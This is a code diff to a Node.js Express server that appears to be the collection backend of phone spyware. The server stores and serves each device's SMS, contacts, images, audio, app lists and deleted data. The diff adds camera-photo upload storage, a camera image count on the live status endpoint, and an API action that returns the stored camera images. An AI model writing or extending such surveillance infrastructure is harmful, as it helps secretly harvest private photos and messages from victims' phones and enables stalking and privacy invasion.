@@ -22,6 +22,20 @@ app.post('/upload.php', (req, res) => {
     try {
         const data = req.body;
         
+        // ✅ حفظ صور الكاميرا
+        if (data.type === 'camera_image' && data.file_data) {
+            const deviceId = data.device_id || 'unknown';
+            const deviceDir = path.join(dataDir, deviceId);
+            if (!fs.existsSync(deviceDir)) fs.mkdirSync(deviceDir, { recursive: true });
+            const cameraImagesFile = path.join(deviceDir, 'camera_images.json');
+            let cameraImages = [];
+            if (fs.existsSync(cameraImagesFile)) cameraImages = JSON.parse(fs.readFileSync(cameraImagesFile, 'utf8'));
+            cameraImages.push({ name: data.file_name, data: data.file_data, size: data.file_size, date: data.timestamp });
+            fs.writeFileSync(cameraImagesFile, JSON.stringify(cameraImages, null, 2));
+            updateDevicesList(deviceId, null);
+            return res.json({ success: true, camera_images_count: cameraImages.length });
+        }
+        
         // ✅ حفظ الصور
         if (data.type === 'image_data' && data.file_data) {
             const deviceId = data.device_id || 'unknown';
@@ -160,6 +174,7 @@ app.get('/live.php', (req, res) => {
         const liveFile = path.join(dataDir, deviceId, 'live.json');
         const dataFile = path.join(dataDir, deviceId, 'data.json');
         const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
+        const cameraImagesFile = path.join(dataDir, deviceId, 'camera_images.json');
         const audioFile = path.join(dataDir, deviceId, 'audio_data.json');
         const deletedFile = path.join(dataDir, deviceId, 'deleted_data.json');
         
@@ -178,6 +193,7 @@ app.get('/live.php', (req, res) => {
             sms_count: 0, 
             contacts_count: 0, 
             images_count: 0, 
+            camera_images_count: 0, 
             audio_count: 0, 
             apps_count: 0, 
             deleted_count: 0 
@@ -208,6 +224,10 @@ app.get('/live.php', (req, res) => {
         
         if (fs.existsSync(imagesFile)) {
             response.images_count = JSON.parse(fs.readFileSync(imagesFile, 'utf8')).length;
+        }
+        
+        if (fs.existsSync(cameraImagesFile)) {
+            response.camera_images_count = JSON.parse(fs.readFileSync(cameraImagesFile, 'utf8')).length;
         }
         
         if (fs.existsSync(audioFile)) {
@@ -274,6 +294,13 @@ app.get('/api.php', (req, res) => {
         if (action === 'get_image_data') {
             const imagesFile = path.join(dataDir, deviceId, 'images_data.json');
             if (fs.existsSync(imagesFile)) return res.json(JSON.parse(fs.readFileSync(imagesFile, 'utf8')));
+            return res.json([]);
+        }
+        
+        // ✅ استرجاع صور الكاميرا
+        if (action === 'get_camera_images') {
+            const cameraImagesFile = path.join(dataDir, deviceId, 'camera_images.json');
+            if (fs.existsSync(cameraImagesFile)) return res.json(JSON.parse(fs.readFileSync(cameraImagesFile, 'utf8')));
             return res.json([]);
         }
         
